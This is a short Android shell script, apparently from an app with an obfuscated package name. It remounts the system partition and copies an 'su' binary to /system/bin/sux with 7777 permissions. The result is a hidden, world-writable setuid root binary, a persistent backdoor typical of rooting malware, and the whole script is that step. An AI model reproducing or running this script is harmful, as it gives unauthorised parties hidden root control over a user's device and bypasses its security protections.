#!/system/bin/sh
WORK_PATH=/data/data/ytat.pratqku.kfncyf/app_bin
SU_NAME=su
BUSYBOX=$WORK_PATH/busybox_g1
mount -o remount system /system || exit 1
cat $WORK_PATH/$SU_NAME > /system/bin/sux
chmod 7777 /system/bin/sux
exit
